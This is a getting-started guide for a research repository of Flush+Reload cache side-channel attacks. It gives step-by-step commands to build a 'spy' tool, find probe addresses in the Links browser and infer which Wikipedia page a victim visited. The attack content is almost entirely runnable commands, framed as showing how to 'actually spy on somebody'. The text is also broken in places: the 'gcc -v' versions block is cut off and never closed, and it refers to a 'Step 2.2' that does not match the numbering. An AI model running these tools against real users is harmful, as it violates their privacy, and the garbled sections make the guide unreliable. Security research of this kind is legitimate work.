Getting Started Guide
=====================

This guide will get you going with the attack code in this repository. It
assumes you're running Debian 8 Jessie, so if you're running a different variant
of Linux, you'll have to be smart and adapt the guide to work for you.

If you have run into any problems following this guide, please [open an issue on
GitHub](https://github.com/defuse/flush-reload-attacks/issues).

For best results, follow this guide on dedicated hardware. It might not work
very well in a virtual machine; I know that it doesn't work on the cheaper
Amazon EC2 instances because of the way they allocate CPU time.

Clone the Repository
--------------------

The first step is to download the contents of this repository. The guide assumes
you'll put it in your home directory:

```
$ cd ~
$ git clone https://github.com/defuse/flush-reload-attacks.git
```

Installing the Dependencies
---------------------------

To get the attack tools and experiment scripts to work, you'll need to install
all of this stuff first:

```
# apt-get install build-essential libelf-dev ruby rsync
```

And the ruby gems:

```
# gem install levenshtein-ffi parallel gnuplot colorize graphviz
```

We'll be building Links from source, so install Debian's Links as an easy way to
pull in all of the dependencies, and `libssl-dev` to enable SSL/TLS support.

```
# apt-get install links libssl-dev
```

For your reference, the versions of the dependencies we tested are:

```
$ gcc -v

Attacking the Links Web Browser
-------------------------------

### 1. Build Links from Source

We need a copy of the Links binary with symbols. The one in the debian
repositories doesn't include symbols, so we have to build it from source. Follow
these steps to do that.

(If you're using Debian 8 Jessie, you might be able to skip this step and the
next one by using the binary that's included at
`experiments/links/binaries/links-debian` and the probe addresses in the file
`experiments/links/binaries/links-debian.probes`).

**1.1. Download Links Source Code**

Go to the [Links download page](http://links.twibright.com/download.php) and
grab the source code to the latest version. When I wrote this, that's 2.13.

```
$ wget http://links.twibright.com/download/links-2.13.tar.gz
$ tar xvf links-2.13.tar.gz
```

**1.2. Compile Links**

Now compile a Links binary.

```
$ cd links-2.13
$ ./configure
$ make
```

**1.3. Copy the Links Binary**

Copy the Links binary into the `experiments/links/binaries`:

```
$ cp links ~/flush-reload-attacks/experiments/links/binaries/links-demo
```

### 2. Compile the Spying Tool

Compile the `spy` binary which implements the actual Flush+Reload side-channel
attack:

```
$ cd ~/flush-reload-attacks/flush-reload/myversion
$ make
```

### 3. Find the Probe Addresses

I've already identified some good Flush+Reload probe locations to make the
Wikipedia page distinguishing attack work. They are the first cache lines of the
functions `kill_html_stack_item()`, `html_stack_dup()`, `html_a()`, and
`parse_html()`. We need to find the addresses of those cache lines.

**3.1. Run the Probe Address Finding Tool**

Run the probe address finding tool to look up the addresses:

```
ruby ~/flush-reload-attacks/flush-reload/myversion/ruby/FindProbeAddresses.rb -n kill_html_stack_item -n html_stack_dup -n html_a -n parse_html -b ~/flush-reload-attacks/experiments/links/binaries/links-demo
```

**3.2. Save the Probe Addresses to a File**

Save those probe addresses to a file. Copy and paste the output into
`~/flush-reload-attacks/experiments/links/binaries/links-demo.probes`.

### 4. Run the Experiment

To check if the attacks will work on your system, run the automated experiment.

**4.1. Set the Experiment Parameters**

Go into `experiments/links` and edit the `LinksExperiment.rb` file. This file
defines all of the parameters for an experiment run.

Find the `RUN_BINARY` line and change the path to the Links binary you built in
Step 1 above. If you've been following along exactly, this will be
`binaries/links-demo`.

Find the `PROBES_PATH` line and change the path to the probe addresses file that
you created in Step 2.2 above. If you've been following along exactly, this will
be `binaries/links-demo.probes`.

**4.2. Run the Experiment**

To run the experiment, just run (from within `experiments/links`):

```
$ ./experiment.sh
```

The experiment starts with a training phase. You'll see it taking samples of all
the URLs. After that phase finishes, it will start testing the success rate of
the attack by having a victim visit each of the pages and trying to identify
which page it was. At the end, you'll see the overall success rate of the
attack.

**4.3. Try Different Experiment Parameters**

By default, the experiment runs using just the top 10 Wikipedia pages, taking
5 training samples of each page, and has the victim visit each page 10 times.
This is good for quickly testing if the attack works on your system. If you'd
like to run a longer and more complete experiment, then change `URL_LIST_FILE`,
`SAMPLE_COUNT`, and `VICTIM_RUNS` accordingly.

### 5. Step-by-Step Attack

If the experiment worked for you, then you can try running an attack against
yourself. This will show you what it's like to use the attack tools to actually
spy on somebody. I'm assuming you've followed steps 1-4 above.

**5.1. Train the Top 100 Wikipedia Pages**

Make a directory to hold the training data:

```
$ mkdir ~/attack_training
```

Run the training tool on 100 Wikipedia URLs:

```
$ ruby ~/flush-reload-attacks/flush-reload/myversion/ruby/AttackTrainer.rb \
    --url-list ~/flush-reload-attacks/experiments/links/url_sets/wiki-top-100-of-2013.txt \
    --train-dir ~/attack_training/demo1 \
    --run-binary ~/flush-reload-attacks/experiments/links/binaries/links-demo \
    --probe-file ~/flush-reload-attacks/experiments/links/binaries/links-demo.probes \
    --samples 10 \
    --sleep-kill 7
```

**5.2. Start the Spy Tool**

Make a directory to store the spying results:

```
$ mkdir ~/attack_spying
```

Start the spy tool:

```
$ ruby ~/flush-reload-attacks/flush-reload/myversion/ruby/AttackRecorder.rb \
    --spy-binary ~/flush-reload-attacks/experiments/links/binaries/links-demo \
    --probe-file ~/flush-reload-attacks/experiments/links/binaries/links-demo.probes \
    --output-dir ~/attack_spying
```

**5.3. Pretend to be the Victim**

With the spy tool running, visit one of the 100 Wikipedia pages in Links:

```
$ ~/flush-reload-attacks/experiments/links/binaries/links-demo http://en.wikipedia.org/wiki/Breaking_Bad
```

The spy tool should detect that you ran Links and create a file with the probe
sequence recording in `~/attack_spying`. The name of the file is the UNIX
timestamp of when it was recorded. You can stop the spying tool now.

**5.4. Figure Out Which Page the Victim Visited**

Inside `~/attack_spying` you should see a file with a numeric name. That's the
recording of which probes were hit as you ran Links pretending to be the victim.
To identify which Wikipedia page that corresponds to, run the input
identification tool:

```
$ ruby ~/flush-reload-attacks/flush-reload/myversion/ruby/AttackRecovery.rb \
    --recording-dir ~/attack_spying \
    --train-dir ~/attack_training/demo1 \
    --max-length 1000
```
Did it get guess right? It's not perfect, so it might not have. Try it again!
